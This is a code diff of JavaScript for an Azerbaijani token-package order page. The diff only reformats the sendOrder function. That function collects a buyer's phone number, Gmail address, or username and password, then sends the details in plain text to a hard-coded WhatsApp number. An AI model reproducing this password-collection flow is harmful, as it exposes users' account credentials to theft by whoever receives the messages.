@@ -254,26 +254,31 @@
         if(type === "QR") document.getElementById('f-qr').style.display = 'block';  
     }  
 
-    function sendOrder() {  
-        const paket = document.getElementById('jetonPaketi').value;  
-        const nov = document.getElementById('melumatNovu').value;  
-        let detay = "";  
+    function sendOrder() {
+    const paket = document.getElementById('jetonPaketi').value;
+    const nov = document.getElementById('melumatNovu').value;
+    let detay = "";
 
-        if(nov === "Nömrə") detay = "Nömrə: " + document.getElementById('phoneInput').value;  
-        else if(nov === "User") detay = "User: " + document.getElementById('userInput').value + " / Şifrə: " + document.getElementById('passInput').value;  
-        else if(nov === "Gmail") detay = "Gmail: " + document.getElementById('gmailInput').value;  
-        else if(nov === "QR") detay = "QR kod göndəriləcək";  
-        else { alert("Zəhmət olmasa məlumat növünü seçin!"); return; }  
+    if(nov === "Nömrə") detay = "Nömrə: " + document.getElementById('phoneInput').value;
+    else if(nov === "User") detay = "User: " + document.getElementById('userInput').value + " / Şifrə: " + document.getElementById('passInput').value;
+    else if(nov === "Gmail") detay = "Gmail: " + document.getElementById('gmailInput').value;
+    else if(nov === "QR") detay = "QR kod göndəriləcək";
+    else { alert("Zəhmət olmasa məlumat növünü seçin!"); return; }
 
-        const msg =
-        "\u26A1 YENİ SİFARİŞ \u26A1\n" +
-        "-----------\n" +
-        "\uD83D\uDC8E Paket: " + paket + "\n" +
-        "\uD83D\uDD11 Növ: " + nov + "\n" +
-        "\uD83D\uDCDD Detallar: " + detay;
-  
-        window.open(`https://wa.me/994506775351?text=${encodeURIComponent(msg)}`, '_blank');  
-    }  
+    const msg =
+`⚡ YENİ SİFARİŞ ⚡
+-----------
+💎 Paket: ${paket}
+🔑 Növ: ${nov}
+📝 Detallar: ${detay}`;
+
+    const url =
+      "https://api.whatsapp.com/send?phone=994506775351&text=" +
+      encodeURIComponent(msg);
+
+    window.open(url, "_blank");
+}
+
 
     // Statistikaları Yenilə  
     function updateOrderStats() {  
